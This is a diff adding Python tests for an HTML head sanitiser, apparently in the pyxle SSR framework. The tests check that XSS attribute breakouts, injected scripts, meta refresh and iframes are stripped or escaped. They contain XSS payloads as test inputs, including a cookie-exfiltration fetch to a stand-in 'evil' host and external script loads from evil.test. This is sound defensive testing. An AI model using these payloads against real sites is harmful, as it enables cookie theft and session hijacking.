@@ -350,6 +350,125 @@ class TestSanitizeHeadElement:
         assert 'rel="icon"' in result
 
 
+class TestHeadAttributeEscaping:
+    """SEC-HEAD-XSS-1: attribute-value quote breakout must be neutralised, and
+    only an allowlist of head tags may pass through."""
+
+    def test_quote_breakout_in_meta_content_neutralised(self) -> None:
+        # The canonical audit payload: a double-quote ends the attribute early
+        # and injects a <script> after </head>.
+        malicious = '<meta name="description" content="normal"></head><script>alert(1)</script>'
+        result = sanitize_head_element(malicious)
+        assert "<script>" not in result
+        assert "</head>" not in result
+        assert "alert(1)" not in result
+        assert result == '<meta name="description" content="normal"/>'
+
+    def test_realistic_loader_data_breakout_neutralised(self) -> None:
+        # A loader feeds a search term into a meta tag; the term breaks out.
+        term = 'shoes"><script>fetch("//evil/?c="+document.cookie)</script>'
+        result = sanitize_head_element(f'<meta name="description" content="{term}"/>')
+        assert "<script>" not in result
+        assert "document.cookie" not in result
+        # The (truncated, escaped) value survives as an inert attribute.
+        assert result.startswith('<meta name="description" content="shoes')
+        assert result.endswith("/>")
+
+    def test_attribute_values_are_html_escaped(self) -> None:
+        # An embedded quote is escaped to &quot; rather than closing the attr.
+        result = sanitize_head_element('<meta name="x" content="a&quot;b">')
+        assert "&quot;" in result
+        assert result == '<meta name="x" content="a&quot;b"/>'
+
+    def test_inline_script_without_src_preserved(self) -> None:
+        # Inline init scripts in the head are a supported trusted-author feature.
+        original = "<script>window.__init = true;</script>"
+        assert sanitize_head_element(original) == original
+
+    def test_inline_style_preserved(self) -> None:
+        original = "<style>body{color:red}</style>"
+        assert sanitize_head_element(original) == original
+
+    def test_meta_refresh_rejected(self) -> None:
+        result = sanitize_head_element('<meta http-equiv="refresh" content="0;url=//evil.test">')
+        assert result == ""
+
+    def test_meta_http_equiv_nonrefresh_kept(self) -> None:
+        result = sanitize_head_element('<meta http-equiv="X-UA-Compatible" content="IE=edge">')
+        assert 'http-equiv="X-UA-Compatible"' in result
+        assert result.endswith("/>")
+
+    def test_disallowed_tag_dropped(self) -> None:
+        assert sanitize_head_element('<iframe src="//evil.test"></iframe>') == ""
+        assert sanitize_head_element("<object data='x'></object>") == ""
+
+    def test_breakout_via_link_attribute_neutralised(self) -> None:
+        malicious = '<link rel="canonical" href="/x"><script>alert(1)</script>'
+        result = sanitize_head_element(malicious)
+        assert "<script>" not in result
+        assert result == '<link rel="canonical" href="/x"/>'
+
+    def test_no_tag_fails_closed(self) -> None:
+        # A head string with no recognisable element is dropped, not echoed.
+        assert sanitize_head_element("just some text, no tags") == ""
+
+    def test_title_close_then_script_is_dropped(self) -> None:
+        # A single injected </title> followed by a <script> must NOT leave a
+        # live script in <head> — the markup after the close is discarded.
+        result = sanitize_head_element(
+            "<title>x</title><script>alert(document.cookie)</script>"
+        )
+        assert "<script>" not in result
+        assert "document.cookie" not in result
+        assert result == "<title>x</title>"
+
+    def test_title_close_then_external_script_is_dropped(self) -> None:
+        result = sanitize_head_element(
+            '<title>Site</title><script src="//evil.test/x.js"></script>'
+        )
+        assert "<script" not in result
+        assert "evil.test" not in result
+
+    def test_title_close_then_svg_onload_is_dropped(self) -> None:
+        result = sanitize_head_element("<title>Hi</title><svg onload=alert(1)>")
+        assert "<svg" not in result
+        assert "onload" not in result
+        assert result == "<title>Hi</title>"
+
+    def test_unclosed_title_with_script_is_escaped(self) -> None:
+        # An unclosed <title> followed by markup must not return the raw input;
+        # the markup is escaped into inert title text with a clean close.
+        result = sanitize_head_element("<title>x<script>alert(document.cookie)</script>")
+        assert "<script>" not in result
+        assert "&lt;script&gt;" in result
+        assert result.endswith("</title>")
+
+    def test_attribute_name_with_quote_is_dropped(self) -> None:
+        # A crafted attribute name containing a quote must not be emitted (it
+        # would break the tag's attribute quoting).
+        result = sanitize_head_element('<meta name="x" content="y" a"b=c>')
+        assert result.count('"') % 2 == 0  # quotes stay balanced
+        assert 'a"b' not in result
+        assert 'name="x"' in result
+
+
+class TestMergeHeadVariableXss:
+    """End-to-end: the runtime HEAD-callable path (the documented dynamic-meta
+    recipe) must not let loader data inject markup into <head>."""
+
+    def test_loader_breakout_through_merge_is_inert(self) -> None:
+        from pyxle.ssr.head_merger import merge_head_elements
+
+        excerpt = '"><script>alert(document.cookie)</script>'
+        result = merge_head_elements(
+            head_variable=(f'<meta name="description" content="{excerpt}"/>',),
+            head_jsx_blocks=(),
+        )
+        combined = " ".join(result)
+        assert "<script>" not in combined
+        assert "document.cookie" not in combined
+
+
 class TestEscapeTitleTextContent:
     """Direct tests for the _escape_title_text_content helper."""
 
@@ -357,9 +476,10 @@ class TestEscapeTitleTextContent:
         html = '<meta name="x" content="y"/>'
         assert _escape_title_text_content(html) == html
 
-    def test_title_without_closing_returns_unchanged(self) -> None:
-        html = "<title>Unclosed"
-        assert _escape_title_text_content(html) == html
+    def test_title_without_closing_is_closed(self) -> None:
+        # An unclosed <title> is escaped and given a clean close so it can't
+        # swallow the rest of the document as RCDATA.
+        assert _escape_title_text_content("<title>Unclosed") == "<title>Unclosed</title>"
 
     def test_multiple_close_tags_uses_last(self) -> None:
         html = "<title></title>extra</title>"
